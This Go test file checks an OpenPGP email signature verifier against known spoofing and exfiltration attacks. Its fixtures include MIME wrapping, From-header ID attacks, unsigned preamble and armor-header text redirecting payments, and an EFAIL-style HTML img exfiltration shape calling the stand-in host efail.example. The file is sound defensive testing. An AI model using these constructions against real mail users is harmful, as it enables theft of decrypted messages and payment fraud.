// SPDX-FileCopyrightText: 2026 Martin <dev@amsys.cz>
// SPDX-License-Identifier: MIT

package verify

import (
	"bytes"
	"context"
	"crypto"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/ProtonMail/go-crypto/openpgp"
	"github.com/ProtonMail/go-crypto/openpgp/armor"
	"github.com/ProtonMail/go-crypto/openpgp/clearsign"
	"github.com/ProtonMail/go-crypto/openpgp/packet"
)

// pgpKey makes a new key for email. A non-nil cfg sets the creation
// time, the lifetime and the hash.
func pgpKey(t *testing.T, name, email string, cfg *packet.Config) *openpgp.Entity {
	t.Helper()
	e, err := openpgp.NewEntity(name, "", email, cfg)
	if err != nil {
		t.Fatalf("new entity: %v", err)
	}
	return e
}

// keyDir writes the public keys of es, armored, to a new directory.
func keyDir(t *testing.T, es ...*openpgp.Entity) string {
	t.Helper()
	dir := t.TempDir()
	for i, e := range es {
		var buf bytes.Buffer
		w, err := armor.Encode(&buf, openpgp.PublicKeyType, nil)
		if err != nil {
			t.Fatal(err)
		}
		if err := e.Serialize(w); err != nil {
			t.Fatal(err)
		}
		_ = w.Close()
		if err := os.WriteFile(filepath.Join(dir, strings.Repeat("k", i+1)+".asc"), buf.Bytes(), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// armoredPub gives the armored public key of e.
func armoredPub(t *testing.T, e *openpgp.Entity) string {
	t.Helper()
	var buf bytes.Buffer
	w, _ := armor.Encode(&buf, openpgp.PublicKeyType, nil)
	if err := e.Serialize(w); err != nil {
		t.Fatal(err)
	}
	_ = w.Close()
	return buf.String()
}

// detach gives an armored detached signature by e over data.
func detach(t *testing.T, e *openpgp.Entity, data []byte, cfg *packet.Config) string {
	t.Helper()
	var buf bytes.Buffer
	if cfg != nil && cfg.DefaultHash == crypto.SHA1 {
		return detachSHA1(t, e, data)
	}
	if err := openpgp.ArmoredDetachSign(&buf, e, bytes.NewReader(data), cfg); err != nil {
		t.Fatalf("sign: %v", err)
	}
	return buf.String()
}

// detachSHA1 gives an armored v4 SHA-1 signature by e over data. The
// go-crypto signer refuses SHA-1, but its verifier accepts a v4 SHA-1
// signature, so the test builds the packet by hand.
func detachSHA1(t *testing.T, e *openpgp.Entity, data []byte) string {
	t.Helper()
	pk := e.PrivateKey
	sig := &packet.Signature{
		Version: pk.Version, SigType: packet.SigTypeBinary, PubKeyAlgo: pk.PubKeyAlgo,
		Hash: crypto.SHA1, CreationTime: time.Now(), IssuerKeyId: &pk.KeyId,
		IssuerFingerprint: pk.Fingerprint,
	}
	noSalt := false // the salt notation has no SHA-1 size
	cfg := &packet.Config{NonDeterministicSignaturesViaNotation: &noSalt}
	h, err := sig.PrepareSign(cfg)
	if err != nil {
		t.Fatal(err)
	}
	h.Write(data)
	if err := sig.Sign(h, pk, cfg); err != nil {
		t.Fatalf("sign sha1: %v", err)
	}
	var buf bytes.Buffer
	w, _ := armor.Encode(&buf, openpgp.SignatureType, nil)
	if err := sig.Serialize(w); err != nil {
		t.Fatal(err)
	}
	_ = w.Close()
	return buf.String()
}

// crlf gives s with each line break as "\r\n". A "\r\n" in s stays
// as it is.
func crlf(s string) string {
	return strings.ReplaceAll(strings.ReplaceAll(s, "\r\n", "\n"), "\n", "\r\n")
}

// signedEntity builds a PGP/MIME multipart/signed entity (RFC 3156)
// over inner, signed by e. pre and epi go in the preamble and the
// epilogue. The result has a header and CRLF line breaks.
func signedEntity(t *testing.T, e *openpgp.Entity, inner, pre, epi string, cfg *packet.Config) string {
	t.Helper()
	inner = crlf(inner)
	sig := detach(t, e, []byte(inner), cfg)
	return crlf("Content-Type: multipart/signed; micalg=pgp-sha256;\n"+
		" protocol=\"application/pgp-signature\"; boundary=\"sig\"\n\n") +
		crlf(pre) + "--sig\r\n" + inner + "\r\n--sig\r\n" +
		crlf("Content-Type: application/pgp-signature; name=\"signature.asc\"\n\n") +
		crlf(sig) + "\r\n--sig--\r\n" + crlf(epi)
}

// withFrom puts a top message header with From on top of ent, which
// starts with its own Content-Type header.
func withFrom(from, ent string) []byte {
	return []byte(crlf("From: "+from+"\nTo: me@home.example\nSubject: invoice\nMIME-Version: 1.0\n") + ent)
}

// mixed wraps the entities in a multipart/mixed entity.
func mixed(ents ...string) string {
	var b strings.Builder
	b.WriteString(crlf("Content-Type: multipart/mixed; boundary=\"mix\"\n\n"))
	for _, e := range ents {
		b.WriteString("--mix\r\n" + e + "\r\n")
	}
	b.WriteString("--mix--\r\n")
	return b.String()
}

// textPart is a text/plain entity with body.
func textPart(body string) string {
	return crlf("Content-Type: text/plain; charset=utf-8\n\n" + body)
}

// htmlPart is a text/html entity with body.
func htmlPart(body string) string {
	return crlf("Content-Type: text/html; charset=utf-8\n\n" + body)
}

// clearsigned gives a clearsigned block of text by e.
func clearsigned(t *testing.T, e *openpgp.Entity, text string) string {
	t.Helper()
	var buf bytes.Buffer
	w, err := clearsign.Encode(&buf, e.PrivateKey, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := w.Write([]byte(text)); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.String()
}

// TestVerify_PGPVerdictMatrix proves the OpenPGP verdicts of D6.1 and
// D6.2 through Check.
//
// Keys come only from pgp_keys_dir: a key in the message gives no
// trust. verified needs all four conditions of D6.1. The matrix holds
// the 2019 MIME spoofing set ("Johnny, you are fired", Müller et al.:
// MIME wrapping, ID attacks, partial inline signing, preamble and
// epilogue text), the EFAIL 2018 direct exfiltration shape, and a body
// with the words "signature verified" (I12). Each result passes the
// I11 field walk and holds no user ID text.
//
// A revoked or an expired key now gives verdict bad ahead of every
// other condition, and a weak digest now gives partial, not verified
// (DRV.18): the two matrix rows for those keys change their expected
// verdict on purpose, listed in the T169 report.
//
// arch: D6.1, D6.2, DRV.18
func TestVerify_PGPVerdictMatrix(t *testing.T) {
	alice := pgpKey(t, "Alice Liddell", "alice@example.com", nil)
	mallory := pgpKey(t, "Alice Liddell", "alice@example.com", nil) // same user ID, other key
	aliceFP := hex.EncodeToString(alice.PrimaryKey.Fingerprint)
	dir := keyDir(t, alice)
	empty := t.TempDir()

	past := time.Now().Add(-48 * time.Hour)
	pastCfg := &packet.Config{Time: func() time.Time { return past }, KeyLifetimeSecs: 3600}
	expired := pgpKey(t, "Old", "old@example.com", pastCfg)

	revoked := pgpKey(t, "Rev", "rev@example.com", nil)
	revokedSig := signedEntity(t, revoked, textPart("hello"), "", "", nil)
	if err := revoked.RevokeKey(packet.KeyCompromised, "", nil); err != nil {
		t.Fatal(err)
	}

	good := signedEntity(t, alice, textPart("Pay invoice 42."), "", "", nil)
	tampered := strings.Replace(good, "invoice 42", "invoice 99", 1)
	sha1Sig := signedEntity(t, alice, textPart("hello"), "", "", &packet.Config{DefaultHash: crypto.SHA1})

	// The signed part carries the signer's own key, as Autocrypt or an
	// attached key would. It must give no trust.
	keyInMsg := signedEntity(t, mallory, mixed(textPart("hello"),
		crlf("Content-Type: application/pgp-keys\n\n")+crlf(armoredPub(t, mallory))), "", "", nil)

	deep := good
	for i := 0; i < MaxDepth+2; i++ {
		deep = mixed(deep)
	}

	threeParts := strings.Replace(good, "\r\n--sig--\r\n", "\r\n--sig\r\n"+textPart("extra")+"\r\n--sig--\r\n", 1)

	cs := clearsigned(t, alice, "Pay invoice 42.")

	type want struct {
		verdict  string // empty means Check gives nil
		trust    string
		match    bool
		unsigned bool
		weak     bool
		fp       string // expected fingerprint; "-" means any hex
	}
	cases := []struct {
		name string
		dir  string
		raw  []byte
		want want
	}{
		{"good PGP/MIME by From with a pinned key is verified", dir,
			withFrom("Alice <alice@example.com>", good),
			want{VerdictVerified, TrustPinned, true, false, false, aliceFP}},
		{"bare LF line breaks still verify", dir,
			withFrom("alice@example.com", strings.ReplaceAll(good, "\r\n", "\n")),
			want{VerdictVerified, TrustPinned, true, false, false, aliceFP}},
		{"tampered signed part is invalid", dir,
			withFrom("alice@example.com", tampered),
			want{verdict: VerdictInvalid, fp: "-"}},
		{"no key in pgp_keys_dir gives key_unavailable", empty,
			withFrom("alice@example.com", good),
			want{verdict: VerdictKeyUnavailable, trust: TrustUnknown, fp: "-"}},
		{"no pgp_keys_dir configured gives key_unavailable", "",
			withFrom("alice@example.com", good),
			want{verdict: VerdictKeyUnavailable, trust: TrustUnknown, fp: "-"}},
		{"key in the message gives no trust", dir,
			withFrom("alice@example.com", keyInMsg),
			want{verdict: VerdictKeyUnavailable, trust: TrustUnknown, fp: "-"}},

		// 2019 ID attacks: a good signature by a pinned key, but From
		// names another person.
		{"ID attack: From is another address", dir,
			withFrom("ceo@bank.example", good),
			want{VerdictValidUnknownSigner, TrustPinned, false, false, false, aliceFP}},
		{"ID attack: display name holds the signer address", dir,
			withFrom("\"alice@example.com\" <eve@evil.example>", good),
			want{VerdictValidUnknownSigner, TrustPinned, false, false, false, aliceFP}},

		// 2019 MIME wrapping: the signed entity sits next to text the
		// attacker wrote.
		{"MIME wrapping: attacker part before the signed entity", dir,
			withFrom("alice@example.com", mixed(textPart("Pay invoice 99 to IBAN XX."), good)),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},
		{"MIME wrapping: signed entity deep in an alternative", dir,
			withFrom("alice@example.com", mixed(
				crlf("Content-Type: multipart/alternative; boundary=\"alt\"\n\n")+
					"--alt\r\n"+good+"\r\n--alt\r\n"+htmlPart("<p>Pay invoice 99</p>")+"\r\n--alt--\r\n")),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},
		{"MIME wrapping: second signed entity", dir,
			withFrom("alice@example.com", mixed(good, signedEntity(t, alice, textPart("other"), "", "", nil))),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},
		{"preamble text in multipart/signed is unsigned", dir,
			withFrom("alice@example.com", signedEntity(t, alice, textPart("hi"), "Pay invoice 99 now.\n", "", nil)),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},
		{"epilogue text in multipart/signed is unsigned", dir,
			withFrom("alice@example.com", signedEntity(t, alice, textPart("hi"), "", "Pay invoice 99 now.\n", nil)),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},
		{"white space in preamble and epilogue is not content", dir,
			withFrom("alice@example.com", signedEntity(t, alice, textPart("hi"), " \n\n", "\n \t\n", nil)),
			want{VerdictVerified, TrustPinned, true, false, false, aliceFP}},

		// Inline signatures, with the 2019 partial signing case.
		{"inline clearsigned is verified", dir,
			withFrom("alice@example.com", textPart(cs)),
			want{VerdictVerified, TrustPinned, true, false, false, aliceFP}},
		{"inline: text before the block is unsigned", dir,
			withFrom("alice@example.com", textPart("Pay invoice 99 now.\n\n"+cs)),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},
		{"inline: text after the block is unsigned", dir,
			withFrom("alice@example.com", textPart(cs+"\nPay invoice 99 now.\n")),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},
		{"inline: text after a fake marker with a leading space is unsigned", dir,
			withFrom("alice@example.com", textPart(" -----BEGIN PGP SIGNED MESSAGE-----\nPay invoice 99 now.\n\n"+cs)),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},
		{"inline: text after a fake marker in a quote is unsigned", dir,
			withFrom("alice@example.com", textPart("> -----BEGIN PGP SIGNED MESSAGE-----\nPay invoice 99 now.\n"+cs)),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},
		{"inline: HTML part next to the block is unsigned", dir,
			withFrom("alice@example.com", mixed(textPart(cs), htmlPart("<p>Pay invoice 99</p>"))),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},
		{"inline: tampered text is invalid", dir,
			withFrom("alice@example.com", textPart(strings.Replace(cs, "invoice 42", "invoice 99", 1))),
			want{verdict: VerdictInvalid, fp: "-"}},

		// EFAIL 2018 direct exfiltration: attacker HTML parts around
		// an encrypted part, and the same wrap around a signed part.
		{"EFAIL: HTML around multipart/encrypted gives no signature", dir,
			withFrom("alice@example.com", mixed(
				htmlPart(`<img src="http://efail.example/`),
				crlf("Content-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"enc\"\n\n")+
					crlf("--enc\nContent-Type: application/pgp-encrypted\n\nVersion: 1\n--enc\n"+
						"Content-Type: application/octet-stream\n\n-----BEGIN PGP MESSAGE-----\n\nhQEMA\n-----END PGP MESSAGE-----\n--enc--\n"),
				htmlPart(`">`))),
			want{}},
		{"EFAIL: HTML around a signed entity is partial", dir,
			withFrom("alice@example.com", mixed(htmlPart(`<img src="http://efail.example/`), good, htmlPart(`">`))),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},

		// I12: body words never give a verdict.
		{"unsigned body that says signature verified gives nil", dir,
			withFrom("alice@example.com", textPart("Good signature from Alice. signature verified. [GNUPG:] GOODSIG\n")),
			want{}},
		{"signed body that says signature verified but was changed is invalid", dir,
			withFrom("alice@example.com", strings.Replace(
				signedEntity(t, alice, textPart("signature verified"), "", "", nil),
				"signature verified", "Signature verified", 1)),
			want{verdict: VerdictInvalid, fp: "-"}},
		{"words signature verified in the preamble give partial", dir,
			withFrom("alice@example.com", signedEntity(t, alice, textPart("hi"), "signature verified\n", "", nil)),
			want{VerdictPartial, TrustPinned, true, true, false, aliceFP}},

		// Key state and algorithm.
		{"expired key gives verdict bad (DRV.18)", keyDir(t, expired),
			withFrom("old@example.com", signedEntity(t, expired, textPart("hello"), "", "", pastCfg)),
			want{VerdictBad, TrustExpired, true, false, false, hex.EncodeToString(expired.PrimaryKey.Fingerprint)}},
		{"revoked key gives verdict bad (DRV.18)", keyDir(t, revoked),
			withFrom("rev@example.com", revokedSig),
			want{VerdictBad, TrustRevoked, true, false, false, hex.EncodeToString(revoked.PrimaryKey.Fingerprint)}},
		{"SHA-1 signature sets weak_algorithm and gives verdict partial (DRV.18)", dir,
			withFrom("alice@example.com", sha1Sig),
			want{VerdictPartial, TrustPinned, true, false, true, aliceFP}},

		// D6.2 limits give unsupported (D10.3).
		{"tree deeper than MaxDepth is unsupported", dir,
			withFrom("alice@example.com", deep),
			want{verdict: VerdictUnsupported}},
		{"input larger than MaxInput is unsupported", dir,
			withFrom("alice@example.com", mixed(good, textPart(strings.Repeat("a", MaxInput)))),
			want{verdict: VerdictUnsupported}},
		{"multipart/signed with three parts is unsupported", dir,
			withFrom("alice@example.com", threeParts),
			want{verdict: VerdictUnsupported}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			from := tc.raw[len("From: "):bytes.Index(tc.raw, []byte("\r\n"))]
			got := Check(context.Background(), tc.raw, string(from), Config{PGPKeysDir: tc.dir})
			walkSignature(t, got)
			if tc.want.verdict == "" {
				if got != nil {
					t.Fatalf("got %+v, want nil", *got)
				}
				return
			}
			if got == nil {
				t.Fatalf("got nil, want verdict %s", tc.want.verdict)
			}
			if got.Type != TypeOpenPGP || got.Verdict != tc.want.verdict || got.Trust != tc.want.trust ||
				got.SignerMatchesFrom != tc.want.match || got.Unsigned != tc.want.unsigned || got.Weak != tc.want.weak {
				t.Errorf("got %+v, want %+v", *got, tc.want)
			}
			switch tc.want.fp {
			case "":
			case "-":
				if got.Fingerprint == "" {
					t.Errorf("fingerprint empty, want issuer hex")
				}
			default:
				if got.Fingerprint != tc.want.fp {
					t.Errorf("fingerprint %q, want %q", got.Fingerprint, tc.want.fp)
				}
			}
			if got.Verdict == VerdictVerified && (!got.SignerMatchesFrom || got.Unsigned ||
				(got.Trust != TrustPinned && got.Trust != TrustChainValid)) {
				t.Errorf("verified without all four D6.1 conditions: %+v", *got)
			}
			js, _ := json.Marshal(got)
			for _, bad := range []string{"Alice", "Liddell", "example.com", "signature verified"} {
				if strings.Contains(string(js), bad) {
					t.Errorf("result %s holds sender text %q (I11)", js, bad)
				}
			}
		})
	}
}

// TestLoadKeyring_ArmoredBinaryAndLimit proves LoadKeyring reads both
// an armored and a binary key file, follows a symlink to a key file
// (os.Stat, not a lstat-like call), and skips a file over maxKeyFile
// no matter its content.
//
// arch: DR1G.12
func TestLoadKeyring_ArmoredBinaryAndLimit(t *testing.T) {
	alice := pgpKey(t, "Alice", "alice@example.com", nil)
	bob := pgpKey(t, "Bob", "bob@example.com", nil)
	dir := t.TempDir()

	// Armored.
	if err := os.WriteFile(filepath.Join(dir, "alice.asc"), []byte(armoredPub(t, alice)), 0o600); err != nil {
		t.Fatal(err)
	}
	// Binary: Entity.Serialize with no armor.Encode wrapper.
	var bin bytes.Buffer
	if err := bob.Serialize(&bin); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "bob.gpg"), bin.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	// A symlink to the armored key: os.Stat follows it, so it must add
	// a second copy of Alice's identity.
	if err := os.Symlink(filepath.Join(dir, "alice.asc"), filepath.Join(dir, "link.asc")); err != nil {
		t.Fatal(err)
	}
	// Over maxKeyFile: skipped by size alone, even though it never
	// looks like a key ring.
	big := bytes.Repeat([]byte("x"), maxKeyFile+1)
	if err := os.WriteFile(filepath.Join(dir, "big.asc"), big, 0o600); err != nil {
		t.Fatal(err)
	}

	keys := LoadKeyring(dir)
	if len(keys) != 3 {
		t.Fatalf("len(LoadKeyring(dir)) = %d, want 3 (alice + bob + the symlinked alice copy)", len(keys))
	}
	wantEmails := map[string]int{"alice@example.com": 2, "bob@example.com": 1}
	gotEmails := map[string]int{}
	for _, e := range keys {
		for _, id := range e.Identities {
			gotEmails[id.UserId.Email]++
		}
	}
	if gotEmails["alice@example.com"] != wantEmails["alice@example.com"] ||
		gotEmails["bob@example.com"] != wantEmails["bob@example.com"] {
		t.Errorf("identities by email = %v, want %v", gotEmails, wantEmails)
	}
}

// TestVerify_PGPInlineArmorHeaderUnsigned proves that an armor header
// in the signature block of an inline clearsigned text sets Unsigned.
//
// The signature does not cover the armor headers, and the read output
// shows the provider body, so a "Comment:" line next to a good
// signature by a pinned key must not give verdict verified. A block
// whose only armor header is "Version" stays signed and verified.
//
// arch: REVIEW-2026-10-12 H7
func TestVerify_PGPInlineArmorHeaderUnsigned(t *testing.T) {
	alice := pgpKey(t, "Alice Liddell", "alice@example.com", nil)
	dir := keyDir(t, alice)
	cs := clearsigned(t, alice, "Pay invoice 17 to the usual account.")

	const begin = "-----BEGIN PGP SIGNATURE-----\n"
	if !strings.Contains(cs, begin) {
		t.Fatalf("clearsigned block has no %q line:\n%s", begin, cs)
	}
	withHeader := func(lines string) string {
		return strings.Replace(cs, begin, begin+lines, 1)
	}

	cases := []struct {
		name         string
		body         string
		wantUnsigned bool
		wantVerdict  string
	}{
		{"Comment header after BEGIN PGP SIGNATURE is unsigned",
			withHeader("Comment: UPDATE - use new IBAN XX00 9999 instead\n"),
			true, VerdictPartial},
		{"Comment header next to a Version header is unsigned",
			withHeader("Version: GnuPG v2\nComment: UPDATE - use new IBAN XX00 9999 instead\n"),
			true, VerdictPartial},
		{"Version header only stays signed",
			withHeader("Version: GnuPG v2\n"),
			false, VerdictVerified},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Check(context.Background(), withFrom("alice@example.com", textPart(tc.body)),
				"alice@example.com", Config{PGPKeysDir: dir})
			if got == nil {
				t.Fatalf("got nil, want an OpenPGP result")
			}
			walkSignature(t, got)
			if got.Type != TypeOpenPGP || got.Trust != TrustPinned || !got.SignerMatchesFrom {
				t.Fatalf("got %+v, want a good OpenPGP signature by the pinned key that matches From", *got)
			}
			if got.Unsigned != tc.wantUnsigned || got.Verdict != tc.wantVerdict {
				t.Errorf("Unsigned=%v Verdict=%s, want Unsigned=%v Verdict=%s",
					got.Unsigned, got.Verdict, tc.wantUnsigned, tc.wantVerdict)
			}
			if tc.wantUnsigned && got.Verdict == VerdictVerified {
				t.Errorf("verdict verified with an unsigned armor header: %+v", *got)
			}
		})
	}
}
